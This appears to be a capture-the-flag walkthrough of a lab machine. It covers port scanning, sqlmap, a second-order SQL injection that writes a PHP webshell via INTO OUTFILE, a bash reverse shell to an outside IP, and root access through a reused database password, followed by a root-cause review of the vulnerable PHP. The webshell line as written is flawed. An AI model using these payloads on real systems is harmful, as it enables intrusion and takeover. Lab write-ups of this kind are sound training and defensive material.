# Validation

## Information Gathering
Validation
10.10.11.116

Versions
- OpenSSH 8.2p1
- Apache httpd 2.4.48
- PHP/7.4.23

## Scanning
Of course, start with your nmap scan:
```bash
Nmap scan report for 10.10.11.116
Host is up (0.039s latency).
Not shown: 65522 closed tcp ports (reset)
PORT     STATE    SERVICE        VERSION
22/tcp   open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
80/tcp   open     http           Apache httpd 2.4.48 ((Debian))
|_http-title: Site doesnt have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.48 (Debian)
4566/tcp open     http           nginx
|_http-title: 403 Forbidden
5000/tcp filtered upnp
5001/tcp filtered commplex-link
5002/tcp filtered rfe
5003/tcp filtered filemaker
5004/tcp filtered avt-profile-1
5005/tcp filtered avt-profile-2
5006/tcp filtered wsm-server
5007/tcp filtered wsm-server-ssl
5008/tcp filtered synapsis-edge
8080/tcp open     http           nginx
|_http-title: 502 Bad Gateway
```


I begin logging all the HTTP headers using BurpSuite. There are two main parameters that stick out: username and country. I manually attempt to perform a SQL injection on country and see an error in the output response. I run sqlmap (even though I do not like sqlmap) to see if I can perhaps dump a database or get a os-shell.

```bash
sqlmap -u "http://10.10.11.116/" --data="username=test&country=Belize" -p "country" --dbs
```

After many different attempts, I do not get anywhere. Whenever I attempt to perform a SQL injection, I always try to think about the payload being used in the query. This is what I **think** the payload looks like:

```php
"SELECT username FROM registration WHERE country='".$country_name."'";
```

```php
"SELECT username FROM registration WHERE country='' UNION SELECT 1-- -'";
```


Doing a bit of research leads me to try and perform a second order SQL injection. Using **country' UNION SELECT 1--** displays a 1 on the page and no error meaning that a 1 is being returned from the result of the sql query.

```php
"SELECT username FROM registration WHERE country='country_name' UNION SELECT 1-- -'"
```

This second order SQLi in addition to the server running PHP allows for writing to a file

```sql
country_name' UNION SELECT "<?php SYSTEM(['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'-- -
```

Which'll look something like:

```php
"SELECT username FROM registration WHERE country='country_name' UNION SELECT "<?php SYSTEM(['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'-- -'"
```

Uploads a webshell for us. You can then catch a reverse shell by using the basic **bash -c "bash -i >& /dev/tcp/10.10.14.15/1337 0>&1"** in your request.

## Privilege Escalation
Because this is a PHP application, I know the application must be making a connection to the database somewhere. In config.php, the following is revealed
```php
<?php
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-9qual-global-pw";
  $dbname = "registration";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
```

Trying this password for the root account gives us a root shell.

## Understanding Second Order SQLi
In this section, I'll be looking at the code which caused the second order SQLi. This was my first time being exposed to this kind of vulnerability so I would like to perform a root cause analysis. This way, I'll not only be able to detect this type of vulnerability sooner but I'll also be able to avoid the same mistake in my development career.

Doing a bit of [reading](https://www.rapid7.com/blog/post/2016/09/27/sql-injection-attacks/), I gathered this: In a second order inejction attack, malicious user input is saved in a database, escaped, entered as prepared statement or otherwise. If a cleverly crafted value is saved in a database and reused later in an unsafe manner, it could still be used to exploit a vulnerabilityin SQL query security.

Looking at index.php (only the PHP code will suffice):

```php
<?php                                                                                                                 
  require('config.php');                                                                                              
  if ( $_SERVER['REQUEST_METHOD'] == 'POST' ) {          
    $userhash = md5($_POST['username']);                                                                              
    $sql = "INSERT INTO registration (username, userhash, country, regtime) VALUES (?, ?, ?, ?)";                     
    $stmt = $conn->prepare($sql);                                                                                     
    $stmt->bind_param("sssi", $_POST['username'], $userhash , $_POST['country'], time());                             
    if ($stmt->execute()) {;                                                                                          
            setcookie('user', $userhash);                                                                             
            header("Location: /account.php");                                                                         
            exit;                                                                                                     
    }                                                                                                                 
    $sql = "update registration set country = ? where username = ?";                                                  
    $stmt = $conn->prepare($sql);                                                                                     
    $stmt->bind_param("ss", $_POST['country'], $_POST['username']);                                                   
    $stmt->execute();                                                                                                 
    setcookie('user', $userhash);                                                                                     
    header("Location: /account.php");                                                                                 
    exit;                                                                                                             
  }                                                                                                                   
                                                                                                                      
?>
```

**$userhash** is generated by simply performing an MD5 digest on the **username** POST parameter. Then username, userhash, county, and time gets stored into the database. This then sets the user cookie and redirects to /account.php.

At this point the payload **country_name' UNION SELECT 1-- -** is stored into the database.

Looking at account.php:

```php
<?php
if (!isset($_COOKIE['user'])) {
  echo "Please Register!";
  exit;
}

?>

<div class="container">
                <h1 class="text-center m-5">Join the UHC - September Qualifiers</h1>

        </div>
        <section class="bg-dark text-center p-5 mt-4">
                <div class="container p-5">
            <?php 
              include('config.php');
              $user = $_COOKIE['user'];
              $sql = "SELECT username, country FROM registration WHERE userhash = ?";
              $stmt = $conn->prepare($sql);
              $stmt->bind_param("s", $user);
              $stmt->execute();
              
              $result = $stmt->get_result(); // get the mysqli result
              $row = $result->fetch_assoc(); // fetch data   
              echo '<h1 class="text-white">Welcome ' . $row['username'] . '</h1>';
              echo '<h3 class="text-white">Other Players In ' . $row['country'] . '</h3>';
              $sql = "SELECT username FROM registration WHERE country = '" . $row['country'] . "'";
              $result = $conn->query($sql);
              while ($row = $result->fetch_assoc()) {
                echo "<li class='text-white'>" . $row['username'] . "</li>";
              }
?>
                </div>
        </section>
</div>
```

Shows that values from the database are pulled from the **$user** variable which gets its value from the **user** cookie. Remembering back to the error message that was originally returned: *Uncaught Error: Call to a member function fetch_assoc() on bool in
/var/www/html/account.php:33*. Fetching the row from the results causes the error to be returned. 

My hunch is that something in the fetch_assoc() method causes there to be the second order SQLi.

As an aside, I was able to go back and put in the payload **username=d1&country=Bolivia' OR 1=1-- -** and dump all the rows onto the page. 

